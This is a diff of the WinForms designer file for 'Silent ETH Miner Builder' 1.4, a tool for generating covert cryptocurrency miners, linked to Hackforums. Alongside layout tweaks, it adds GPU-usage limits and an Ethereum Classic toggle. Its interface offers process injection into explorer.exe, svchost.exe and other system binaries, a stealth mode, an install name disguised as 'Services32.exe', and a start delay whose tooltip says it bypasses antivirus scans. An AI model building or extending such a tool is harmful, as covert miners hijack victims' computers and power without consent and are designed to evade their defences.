@@ -24,7 +24,6 @@ Partial Class Form1
     Private Sub InitializeComponent()
         Me.components = New System.ComponentModel.Container()
         Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Form1))
-        Me.BackgroundWorker1 = New System.ComponentModel.BackgroundWorker()
         Me.BackgroundWorker2 = New System.ComponentModel.BackgroundWorker()
         Me.TooltipHelper = New System.Windows.Forms.ToolTip(Me.components)
         Me.Label13 = New System.Windows.Forms.Label()
@@ -42,6 +41,9 @@ Partial Class Form1
         Me.Label25 = New System.Windows.Forms.Label()
         Me.Label15 = New System.Windows.Forms.Label()
         Me.Label28 = New System.Windows.Forms.Label()
+        Me.Label21 = New System.Windows.Forms.Label()
+        Me.helpLabelMaxCPU = New System.Windows.Forms.Label()
+        Me.Label18 = New System.Windows.Forms.Label()
         Me.MephForm1 = New SilentETHMiner.MephTheme()
         Me.MephTabcontrol2 = New SilentETHMiner.MephTabcontrol()
         Me.TabPage1 = New System.Windows.Forms.TabPage()
@@ -88,6 +90,14 @@ Partial Class Form1
         Me.btnBrowseIcon = New SilentETHMiner.MephButton()
         Me.txtIconPath = New SilentETHMiner.MephTextBox()
         Me.TabPage6 = New System.Windows.Forms.TabPage()
+        Me.Label19 = New System.Windows.Forms.Label()
+        Me.toggleEnableETC = New SilentETHMiner.MephToggleSwitch()
+        Me.labelWiki = New System.Windows.Forms.LinkLabel()
+        Me.Label17 = New System.Windows.Forms.Label()
+        Me.txtIdleGPU = New SilentETHMiner.MephComboBox()
+        Me.txtMaxGPU = New SilentETHMiner.MephComboBox()
+        Me.Label22 = New System.Windows.Forms.Label()
+        Me.Label16 = New System.Windows.Forms.Label()
         Me.MephButton1 = New SilentETHMiner.MephButton()
         Me.Label5 = New System.Windows.Forms.Label()
         Me.txtInjection = New SilentETHMiner.MephComboBox()
@@ -118,9 +128,6 @@ Partial Class Form1
         Me.TabPage6.SuspendLayout()
         Me.TabPage5.SuspendLayout()
         Me.SuspendLayout()
-        '
-        'BackgroundWorker1
-        '
         '
         'BackgroundWorker2
         '
@@ -226,7 +233,7 @@ Partial Class Form1
         Me.Label36.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label36.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label36.ForeColor = System.Drawing.Color.Teal
-        Me.Label36.Location = New System.Drawing.Point(135, 114)
+        Me.Label36.Location = New System.Drawing.Point(76, 114)
         Me.Label36.Name = "Label36"
         Me.Label36.Size = New System.Drawing.Size(13, 13)
         Me.Label36.TabIndex = 46
@@ -239,13 +246,12 @@ Partial Class Form1
         Me.Label32.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label32.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label32.ForeColor = System.Drawing.Color.Teal
-        Me.Label32.Location = New System.Drawing.Point(212, 81)
+        Me.Label32.Location = New System.Drawing.Point(67, 81)
         Me.Label32.Name = "Label32"
         Me.Label32.Size = New System.Drawing.Size(13, 13)
         Me.Label32.TabIndex = 40
         Me.Label32.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label32, "The Installed miners filename, this filename will show up in places like the Task" &
-        " Manager autostart window.")
+        Me.TooltipHelper.SetToolTip(Me.Label32, resources.GetString("Label32.ToolTip"))
         '
         'Label31
         '
@@ -253,7 +259,7 @@ Partial Class Form1
         Me.Label31.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label31.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label31.ForeColor = System.Drawing.Color.Teal
-        Me.Label31.Location = New System.Drawing.Point(211, 47)
+        Me.Label31.Location = New System.Drawing.Point(72, 48)
         Me.Label31.Name = "Label31"
         Me.Label31.Size = New System.Drawing.Size(13, 13)
         Me.Label31.TabIndex = 39
@@ -294,7 +300,7 @@ Partial Class Form1
         Me.Label26.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label26.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label26.ForeColor = System.Drawing.Color.Teal
-        Me.Label26.Location = New System.Drawing.Point(176, 51)
+        Me.Label26.Location = New System.Drawing.Point(55, 43)
         Me.Label26.Name = "Label26"
         Me.Label26.Size = New System.Drawing.Size(13, 13)
         Me.Label26.TabIndex = 57
@@ -308,7 +314,7 @@ Partial Class Form1
         Me.Label25.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label25.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label25.ForeColor = System.Drawing.Color.Teal
-        Me.Label25.Location = New System.Drawing.Point(405, 14)
+        Me.Label25.Location = New System.Drawing.Point(399, 69)
         Me.Label25.Name = "Label25"
         Me.Label25.Size = New System.Drawing.Size(13, 13)
         Me.Label25.TabIndex = 54
@@ -321,13 +327,12 @@ Partial Class Form1
         Me.Label15.Cursor = System.Windows.Forms.Cursors.Help
         Me.Label15.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
         Me.Label15.ForeColor = System.Drawing.Color.Teal
-        Me.Label15.Location = New System.Drawing.Point(175, 17)
+        Me.Label15.Location = New System.Drawing.Point(82, 18)
         Me.Label15.Name = "Label15"
         Me.Label15.Size = New System.Drawing.Size(13, 13)
         Me.Label15.TabIndex = 39
         Me.Label15.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label15, "If enabled the miner will pause when the computer is active and resume when no ke" &
-        "yboard and mouse input has been detected for the ""Idle Wait"" amount of minutes.")
+        Me.TooltipHelper.SetToolTip(Me.Label15, resources.GetString("Label15.ToolTip"))
         '
         'Label28
         '
@@ -343,13 +348,52 @@ Partial Class Form1
         Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting and starting the miner. This bypasses some anti" &
         "virus scans!")
         '
+        'Label21
+        '
+        Me.Label21.AutoSize = True
+        Me.Label21.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label21.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label21.ForeColor = System.Drawing.Color.Teal
+        Me.Label21.Location = New System.Drawing.Point(388, 39)
+        Me.Label21.Name = "Label21"
+        Me.Label21.Size = New System.Drawing.Size(13, 13)
+        Me.Label21.TabIndex = 64
+        Me.Label21.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label21, resources.GetString("Label21.ToolTip"))
+        '
+        'helpLabelMaxCPU
+        '
+        Me.helpLabelMaxCPU.AutoSize = True
+        Me.helpLabelMaxCPU.Cursor = System.Windows.Forms.Cursors.Help
+        Me.helpLabelMaxCPU.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.helpLabelMaxCPU.ForeColor = System.Drawing.Color.Teal
+        Me.helpLabelMaxCPU.Location = New System.Drawing.Point(388, 10)
+        Me.helpLabelMaxCPU.Name = "helpLabelMaxCPU"
+        Me.helpLabelMaxCPU.Size = New System.Drawing.Size(13, 13)
+        Me.helpLabelMaxCPU.TabIndex = 62
+        Me.helpLabelMaxCPU.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.helpLabelMaxCPU, resources.GetString("helpLabelMaxCPU.ToolTip"))
+        '
+        'Label18
+        '
+        Me.Label18.AutoSize = True
+        Me.Label18.Cursor = System.Windows.Forms.Cursors.Help
+        Me.Label18.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.25!, System.Drawing.FontStyle.Underline)
+        Me.Label18.ForeColor = System.Drawing.Color.Teal
+        Me.Label18.Location = New System.Drawing.Point(71, 70)
+        Me.Label18.Name = "Label18"
+        Me.Label18.Size = New System.Drawing.Size(13, 13)
+        Me.Label18.TabIndex = 71
+        Me.Label18.Text = "?"
+        Me.TooltipHelper.SetToolTip(Me.Label18, "Only enable this if you're mining Ethereum Classic.")
+        '
         'MephForm1
         '
         Me.MephForm1.AccentColor = System.Drawing.Color.FromArgb(CType(CType(0, Byte), Integer), CType(CType(192, Byte), Integer), CType(CType(0, Byte), Integer))
         Me.MephForm1.Anchor = System.Windows.Forms.AnchorStyles.None
         Me.MephForm1.BackColor = System.Drawing.Color.FromArgb(CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer), CType(CType(28, Byte), Integer))
         Me.MephForm1.Controls.Add(Me.MephTabcontrol2)
-        Me.MephForm1.Font = New System.Drawing.Font("Segoe UI", 8.59375!)
+        Me.MephForm1.Font = New System.Drawing.Font("Segoe UI", 9.5!)
         Me.MephForm1.ForeColor = System.Drawing.Color.Gray
         Me.MephForm1.Location = New System.Drawing.Point(0, 0)
         Me.MephForm1.Margin = New System.Windows.Forms.Padding(2)
@@ -359,7 +403,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent ETH Miner Builder 1.3.3"
+        Me.MephForm1.Text = "Silent ETH Miner Builder 1.4"
         '
         'MephTabcontrol2
         '
@@ -371,6 +415,7 @@ Partial Class Form1
         Me.MephTabcontrol2.Controls.Add(Me.TabPage4)
         Me.MephTabcontrol2.Controls.Add(Me.TabPage6)
         Me.MephTabcontrol2.Controls.Add(Me.TabPage5)
+        Me.MephTabcontrol2.Font = New System.Drawing.Font("Segoe UI", 9.5!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(128, Byte))
         Me.MephTabcontrol2.ItemSize = New System.Drawing.Size(32, 85)
         Me.MephTabcontrol2.Location = New System.Drawing.Point(12, 65)
         Me.MephTabcontrol2.Multiline = True
@@ -417,7 +462,7 @@ Partial Class Form1
         Me.Label14.Location = New System.Drawing.Point(10, 35)
         Me.Label14.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label14.Name = "Label14"
-        Me.Label14.Size = New System.Drawing.Size(83, 15)
+        Me.Label14.Size = New System.Drawing.Size(92, 17)
         Me.Label14.TabIndex = 47
         Me.Label14.Text = "Worker Name:"
         '
@@ -442,7 +487,7 @@ Partial Class Form1
         Me.Label7.Location = New System.Drawing.Point(10, 82)
         Me.Label7.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label7.Name = "Label7"
-        Me.Label7.Size = New System.Drawing.Size(60, 15)
+        Me.Label7.Size = New System.Drawing.Size(67, 17)
         Me.Label7.TabIndex = 13
         Me.Label7.Text = "Password:"
         '
@@ -482,7 +527,7 @@ Partial Class Form1
         Me.Label12.Location = New System.Drawing.Point(11, 127)
         Me.Label12.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label12.Name = "Label12"
-        Me.Label12.Size = New System.Drawing.Size(62, 15)
+        Me.Label12.Size = New System.Drawing.Size(70, 17)
         Me.Label12.TabIndex = 44
         Me.Label12.Text = "Extra data:"
         '
@@ -527,7 +572,7 @@ Partial Class Form1
         Me.Label6.Location = New System.Drawing.Point(6, 128)
         Me.Label6.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label6.Name = "Label6"
-        Me.Label6.Size = New System.Drawing.Size(88, 15)
+        Me.Label6.Size = New System.Drawing.Size(98, 17)
         Me.Label6.TabIndex = 11
         Me.Label6.Text = "Wallet Address:"
         '
@@ -552,7 +597,7 @@ Partial Class Form1
         Me.Label8.Location = New System.Drawing.Point(6, 82)
         Me.Label8.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label8.Name = "Label8"
-        Me.Label8.Size = New System.Drawing.Size(34, 15)
+        Me.Label8.Size = New System.Drawing.Size(37, 17)
         Me.Label8.TabIndex = 15
         Me.Label8.Text = "Pool:"
         '
@@ -580,7 +625,7 @@ Partial Class Form1
         Me.Label3.Location = New System.Drawing.Point(5, 36)
         Me.Label3.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label3.Name = "Label3"
-        Me.Label3.Size = New System.Drawing.Size(117, 15)
+        Me.Label3.Size = New System.Drawing.Size(125, 17)
         Me.Label3.TabIndex = 41
         Me.Label3.Text = "Connection Scheme:"
         '
@@ -620,7 +665,7 @@ Partial Class Form1
         Me.toggleWatchdog.BackColor = System.Drawing.Color.Transparent
         Me.toggleWatchdog.Checked = True
         Me.toggleWatchdog.ForeColor = System.Drawing.Color.Black
-        Me.toggleWatchdog.Location = New System.Drawing.Point(81, 109)
+        Me.toggleWatchdog.Location = New System.Drawing.Point(92, 109)
         Me.toggleWatchdog.Margin = New System.Windows.Forms.Padding(2)
         Me.toggleWatchdog.Name = "toggleWatchdog"
         Me.toggleWatchdog.Size = New System.Drawing.Size(50, 24)
@@ -646,14 +691,14 @@ Partial Class Form1
         Me.txtInstallFileName.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
         Me.txtInstallFileName.Enabled = False
         Me.txtInstallFileName.ForeColor = System.Drawing.Color.Silver
-        Me.txtInstallFileName.Location = New System.Drawing.Point(80, 77)
+        Me.txtInstallFileName.Location = New System.Drawing.Point(91, 77)
         Me.txtInstallFileName.Margin = New System.Windows.Forms.Padding(2)
         Me.txtInstallFileName.MaxLength = 32767
         Me.txtInstallFileName.MultiLine = False
         Me.txtInstallFileName.Name = "txtInstallFileName"
         Me.txtInstallFileName.Size = New System.Drawing.Size(127, 24)
         Me.txtInstallFileName.TabIndex = 8
-        Me.txtInstallFileName.Text = "Services.exe"
+        Me.txtInstallFileName.Text = "Services32.exe"
         Me.txtInstallFileName.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
         Me.txtInstallFileName.UseSystemPasswordChar = False
         Me.txtInstallFileName.WordWrap = False
@@ -664,7 +709,7 @@ Partial Class Form1
         Me.Label2.Location = New System.Drawing.Point(8, 45)
         Me.Label2.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label2.Name = "Label2"
-        Me.Label2.Size = New System.Drawing.Size(61, 15)
+        Me.Label2.Size = New System.Drawing.Size(67, 17)
         Me.Label2.TabIndex = 19
         Me.Label2.Text = "Save Path:"
         '
@@ -674,7 +719,7 @@ Partial Class Form1
         Me.Label1.Location = New System.Drawing.Point(8, 78)
         Me.Label1.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label1.Name = "Label1"
-        Me.Label1.Size = New System.Drawing.Size(58, 15)
+        Me.Label1.Size = New System.Drawing.Size(62, 17)
         Me.Label1.TabIndex = 9
         Me.Label1.Text = "Filename:"
         '
@@ -690,7 +735,7 @@ Partial Class Form1
         Me.txtInstallPathMain.ItemHeight = 16
         Me.txtInstallPathMain.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
         Me.txtInstallPathMain.Items.AddRange(New Object() {"Temp", "AppData", "UserProfile"})
-        Me.txtInstallPathMain.Location = New System.Drawing.Point(80, 44)
+        Me.txtInstallPathMain.Location = New System.Drawing.Point(91, 44)
         Me.txtInstallPathMain.Margin = New System.Windows.Forms.Padding(2)
         Me.txtInstallPathMain.Name = "txtInstallPathMain"
         Me.txtInstallPathMain.Size = New System.Drawing.Size(127, 22)
@@ -726,7 +771,7 @@ Partial Class Form1
         Me.Label9.AutoSize = True
         Me.Label9.Location = New System.Drawing.Point(11, 160)
         Me.Label9.Name = "Label9"
-        Me.Label9.Size = New System.Drawing.Size(48, 15)
+        Me.Label9.Size = New System.Drawing.Size(54, 17)
         Me.Label9.TabIndex = 22
         Me.Label9.Text = "Version:"
         '
@@ -1009,6 +1054,17 @@ Partial Class Form1
         'TabPage6
         '
         Me.TabPage6.BackColor = System.Drawing.Color.FromArgb(CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer), CType(CType(50, Byte), Integer))
+        Me.TabPage6.Controls.Add(Me.Label18)
+        Me.TabPage6.Controls.Add(Me.Label19)
+        Me.TabPage6.Controls.Add(Me.toggleEnableETC)
+        Me.TabPage6.Controls.Add(Me.labelWiki)
+        Me.TabPage6.Controls.Add(Me.Label17)
+        Me.TabPage6.Controls.Add(Me.txtIdleGPU)
+        Me.TabPage6.Controls.Add(Me.txtMaxGPU)
+        Me.TabPage6.Controls.Add(Me.Label21)
+        Me.TabPage6.Controls.Add(Me.Label22)
+        Me.TabPage6.Controls.Add(Me.helpLabelMaxCPU)
+        Me.TabPage6.Controls.Add(Me.Label16)
         Me.TabPage6.Controls.Add(Me.MephButton1)
         Me.TabPage6.Controls.Add(Me.Label5)
         Me.TabPage6.Controls.Add(Me.txtInjection)
@@ -1029,11 +1085,112 @@ Partial Class Form1
         Me.TabPage6.TabIndex = 5
         Me.TabPage6.Text = "Mining"
         '
+        'Label19
+        '
+        Me.Label19.AutoSize = True
+        Me.Label19.Font = New System.Drawing.Font("Segoe UI", 9.5!)
+        Me.Label19.Location = New System.Drawing.Point(10, 67)
+        Me.Label19.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label19.Name = "Label19"
+        Me.Label19.Size = New System.Drawing.Size(65, 17)
+        Me.Label19.TabIndex = 70
+        Me.Label19.Text = "Mine ETC:"
+        '
+        'toggleEnableETC
+        '
+        Me.toggleEnableETC.BackColor = System.Drawing.Color.Transparent
+        Me.toggleEnableETC.Checked = False
+        Me.toggleEnableETC.ForeColor = System.Drawing.Color.Black
+        Me.toggleEnableETC.Location = New System.Drawing.Point(104, 66)
+        Me.toggleEnableETC.Margin = New System.Windows.Forms.Padding(2)
+        Me.toggleEnableETC.Name = "toggleEnableETC"
+        Me.toggleEnableETC.Size = New System.Drawing.Size(50, 24)
+        Me.toggleEnableETC.TabIndex = 69
+        Me.toggleEnableETC.Text = "Enable Nicehash Mining"
+        '
+        'labelWiki
+        '
+        Me.labelWiki.AutoSize = True
+        Me.labelWiki.BackColor = System.Drawing.Color.Transparent
+        Me.labelWiki.LinkColor = System.Drawing.Color.FromArgb(CType(CType(255, Byte), Integer), CType(CType(128, Byte), Integer), CType(CType(0, Byte), Integer))
+        Me.labelWiki.Location = New System.Drawing.Point(382, 134)
+        Me.labelWiki.Name = "labelWiki"
+        Me.labelWiki.Size = New System.Drawing.Size(29, 17)
+        Me.labelWiki.TabIndex = 67
+        Me.labelWiki.TabStop = True
+        Me.labelWiki.Text = "wiki"
+        '
+        'Label17
+        '
+        Me.Label17.AutoSize = True
+        Me.Label17.BackColor = System.Drawing.Color.Transparent
+        Me.Label17.Location = New System.Drawing.Point(230, 134)
+        Me.Label17.Name = "Label17"
+        Me.Label17.Size = New System.Drawing.Size(160, 17)
+        Me.Label17.TabIndex = 68
+        Me.Label17.Text = "For help please check the "
+        '
+        'txtIdleGPU
+        '
+        Me.txtIdleGPU.BackColor = System.Drawing.Color.Transparent
+        Me.txtIdleGPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
+        Me.txtIdleGPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
+        Me.txtIdleGPU.Font = New System.Drawing.Font("Verdana", 8.0!)
+        Me.txtIdleGPU.ForeColor = System.Drawing.Color.Silver
+        Me.txtIdleGPU.FormattingEnabled = True
+        Me.txtIdleGPU.ItemHeight = 16
+        Me.txtIdleGPU.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
+        Me.txtIdleGPU.Items.AddRange(New Object() {"0%", "10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"})
+        Me.txtIdleGPU.Location = New System.Drawing.Point(324, 36)
+        Me.txtIdleGPU.Name = "txtIdleGPU"
+        Me.txtIdleGPU.Size = New System.Drawing.Size(60, 22)
+        Me.txtIdleGPU.StartIndex = 10
+        Me.txtIdleGPU.TabIndex = 66
+        '
+        'txtMaxGPU
+        '
+        Me.txtMaxGPU.BackColor = System.Drawing.Color.Transparent
+        Me.txtMaxGPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
+        Me.txtMaxGPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
+        Me.txtMaxGPU.Font = New System.Drawing.Font("Verdana", 8.0!)
+        Me.txtMaxGPU.ForeColor = System.Drawing.Color.Silver
+        Me.txtMaxGPU.FormattingEnabled = True
+        Me.txtMaxGPU.ItemHeight = 16
+        Me.txtMaxGPU.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
+        Me.txtMaxGPU.Items.AddRange(New Object() {"0%", "10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"})
+        Me.txtMaxGPU.Location = New System.Drawing.Point(324, 6)
+        Me.txtMaxGPU.Name = "txtMaxGPU"
+        Me.txtMaxGPU.Size = New System.Drawing.Size(60, 22)
+        Me.txtMaxGPU.StartIndex = 10
+        Me.txtMaxGPU.TabIndex = 65
+        '
+        'Label22
+        '
+        Me.Label22.AutoSize = True
+        Me.Label22.Font = New System.Drawing.Font("Segoe UI", 9.5!)
+        Me.Label22.Location = New System.Drawing.Point(258, 36)
+        Me.Label22.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label22.Name = "Label22"
+        Me.Label22.Size = New System.Drawing.Size(61, 17)
+        Me.Label22.TabIndex = 63
+        Me.Label22.Text = "Idle GPU:"
+        '
+        'Label16
+        '
+        Me.Label16.AutoSize = True
+        Me.Label16.Font = New System.Drawing.Font("Segoe UI", 9.5!)
+        Me.Label16.Location = New System.Drawing.Point(258, 7)
+        Me.Label16.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
+        Me.Label16.Name = "Label16"
+        Me.Label16.Size = New System.Drawing.Size(65, 17)
+        Me.Label16.TabIndex = 61
+        Me.Label16.Text = "Max GPU:"
+        '
         'MephButton1
         '
         Me.MephButton1.BackColor = System.Drawing.Color.Transparent
         Me.MephButton1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer), CType(CType(205, Byte), Integer))
-        Me.MephButton1.Location = New System.Drawing.Point(265, 150)
+        Me.MephButton1.Location = New System.Drawing.Point(265, 159)
         Me.MephButton1.Name = "MephButton1"
         Me.MephButton1.Size = New System.Drawing.Size(145, 23)
         Me.MephButton1.TabIndex = 60
@@ -1042,10 +1199,10 @@ Partial Class Form1
         'Label5
         '
         Me.Label5.AutoSize = True
-        Me.Label5.Location = New System.Drawing.Point(10, 131)
+        Me.Label5.Location = New System.Drawing.Point(10, 140)
         Me.Label5.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label5.Name = "Label5"
-        Me.Label5.Size = New System.Drawing.Size(63, 15)
+        Me.Label5.Size = New System.Drawing.Size(67, 17)
         Me.Label5.TabIndex = 59
         Me.Label5.Text = "Inject Into:"
         '
@@ -1060,7 +1217,7 @@ Partial Class Form1
         Me.txtInjection.ItemHeight = 16
         Me.txtInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
         Me.txtInjection.Items.AddRange(New Object() {"explorer.exe (%WINDIR%)", "nslookup.exe (%WINDIR%/System32)", "cmd.exe (%WINDIR%/System32)", "notepad.exe (%WINDIR%/System32)", "svchost.exe (%WINDIR%/System32)", "conhost.exe (%WINDIR%/System32)"})
-        Me.txtInjection.Location = New System.Drawing.Point(13, 150)
+        Me.txtInjection.Location = New System.Drawing.Point(13, 159)
         Me.txtInjection.Margin = New System.Windows.Forms.Padding(2)
         Me.txtInjection.Name = "txtInjection"
         Me.txtInjection.Size = New System.Drawing.Size(240, 22)
@@ -1071,7 +1228,7 @@ Partial Class Form1
         '
         Me.Label27.AutoSize = True
         Me.Label27.Font = New System.Drawing.Font("Segoe UI", 9.5!)
-        Me.Label27.Location = New System.Drawing.Point(10, 45)
+        Me.Label27.Location = New System.Drawing.Point(10, 40)
         Me.Label27.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label27.Name = "Label27"
         Me.Label27.Size = New System.Drawing.Size(50, 17)
@@ -1083,7 +1240,7 @@ Partial Class Form1
         Me.toggleEnableStealth.BackColor = System.Drawing.Color.Transparent
         Me.toggleEnableStealth.Checked = False
         Me.toggleEnableStealth.ForeColor = System.Drawing.Color.Black
-        Me.toggleEnableStealth.Location = New System.Drawing.Point(124, 45)
+        Me.toggleEnableStealth.Location = New System.Drawing.Point(104, 39)
         Me.toggleEnableStealth.Margin = New System.Windows.Forms.Padding(2)
         Me.toggleEnableStealth.Name = "toggleEnableStealth"
         Me.toggleEnableStealth.Size = New System.Drawing.Size(50, 24)
@@ -1094,7 +1251,7 @@ Partial Class Form1
         '
         Me.Label24.AutoSize = True
         Me.Label24.Font = New System.Drawing.Font("Segoe UI", 9.5!)
-        Me.Label24.Location = New System.Drawing.Point(356, 12)
+        Me.Label24.Location = New System.Drawing.Point(350, 67)
         Me.Label24.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label24.Name = "Label24"
         Me.Label24.Size = New System.Drawing.Size(54, 17)
@@ -1105,7 +1262,7 @@ Partial Class Form1
         '
         Me.Label23.AutoSize = True
         Me.Label23.Font = New System.Drawing.Font("Segoe UI", 9.5!)
-        Me.Label23.Location = New System.Drawing.Point(264, 12)
+        Me.Label23.Location = New System.Drawing.Point(258, 67)
         Me.Label23.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label23.Name = "Label23"
         Me.Label23.Size = New System.Drawing.Size(61, 17)
@@ -1118,7 +1275,7 @@ Partial Class Form1
         Me.txtIdleWait.Enabled = False
         Me.txtIdleWait.Font = New System.Drawing.Font("Segoe UI", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
         Me.txtIdleWait.ForeColor = System.Drawing.Color.Silver
-        Me.txtIdleWait.Location = New System.Drawing.Point(330, 10)
+        Me.txtIdleWait.Location = New System.Drawing.Point(324, 65)
         Me.txtIdleWait.MaxLength = 32767
         Me.txtIdleWait.MultiLine = False
         Me.txtIdleWait.Name = "txtIdleWait"
@@ -1135,7 +1292,7 @@ Partial Class Form1
         Me.Label11.Location = New System.Drawing.Point(10, 14)
         Me.Label11.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.Label11.Name = "Label11"
-        Me.Label11.Size = New System.Drawing.Size(70, 15)
+        Me.Label11.Size = New System.Drawing.Size(76, 17)
         Me.Label11.TabIndex = 30
         Me.Label11.Text = "Idle Mining:"
         '
@@ -1144,7 +1301,7 @@ Partial Class Form1
         Me.toggleEnableIdle.BackColor = System.Drawing.Color.Transparent
         Me.toggleEnableIdle.Checked = False
         Me.toggleEnableIdle.ForeColor = System.Drawing.Color.Black
-        Me.toggleEnableIdle.Location = New System.Drawing.Point(123, 12)
+        Me.toggleEnableIdle.Location = New System.Drawing.Point(103, 12)
         Me.toggleEnableIdle.Margin = New System.Windows.Forms.Padding(2)
         Me.toggleEnableIdle.Name = "toggleEnableIdle"
         Me.toggleEnableIdle.Size = New System.Drawing.Size(50, 24)
@@ -1201,7 +1358,7 @@ Partial Class Form1
         Me.txtStartDelay.Name = "txtStartDelay"
         Me.txtStartDelay.Size = New System.Drawing.Size(34, 24)
         Me.txtStartDelay.TabIndex = 55
-        Me.txtStartDelay.Text = "30"
+        Me.txtStartDelay.Text = "15"
         Me.txtStartDelay.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left
         Me.txtStartDelay.UseSystemPasswordChar = False
         Me.txtStartDelay.WordWrap = False
@@ -1213,7 +1370,7 @@ Partial Class Form1
         Me.labelHackforums.Location = New System.Drawing.Point(57, 167)
         Me.labelHackforums.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.labelHackforums.Name = "labelHackforums"
-        Me.labelHackforums.Size = New System.Drawing.Size(72, 15)
+        Me.labelHackforums.Size = New System.Drawing.Size(77, 17)
         Me.labelHackforums.TabIndex = 22
         Me.labelHackforums.TabStop = True
         Me.labelHackforums.Text = "Hackforums"
@@ -1225,7 +1382,7 @@ Partial Class Form1
         Me.labelGitHub.Location = New System.Drawing.Point(8, 167)
         Me.labelGitHub.Margin = New System.Windows.Forms.Padding(2, 0, 2, 0)
         Me.labelGitHub.Name = "labelGitHub"
-        Me.labelGitHub.Size = New System.Drawing.Size(45, 15)
+        Me.labelGitHub.Size = New System.Drawing.Size(48, 17)
         Me.labelGitHub.TabIndex = 21
         Me.labelGitHub.TabStop = True
         Me.labelGitHub.Text = "GitHub"
@@ -1298,7 +1455,6 @@ Partial Class Form1
     End Sub
 
     Friend WithEvents MephForm1 As MephTheme
-    Friend WithEvents BackgroundWorker1 As System.ComponentModel.BackgroundWorker
     Friend WithEvents BackgroundWorker2 As System.ComponentModel.BackgroundWorker
     Friend WithEvents btn_assemblyRandom As MephButton
     Friend WithEvents btn_assemblyClone As MephButton
@@ -1379,4 +1535,15 @@ Partial Class Form1
     Friend WithEvents txtPoolWorker As MephTextBox
     Friend WithEvents MephGroupBox1 As MephGroupBox
     Friend WithEvents MephButton1 As MephButton
+    Friend WithEvents txtIdleGPU As MephComboBox
+    Friend WithEvents txtMaxGPU As MephComboBox
+    Friend WithEvents Label21 As Label
+    Friend WithEvents Label22 As Label
+    Friend WithEvents helpLabelMaxCPU As Label
+    Friend WithEvents Label16 As Label
+    Friend WithEvents labelWiki As LinkLabel
+    Friend WithEvents Label17 As Label
+    Friend WithEvents Label18 As Label
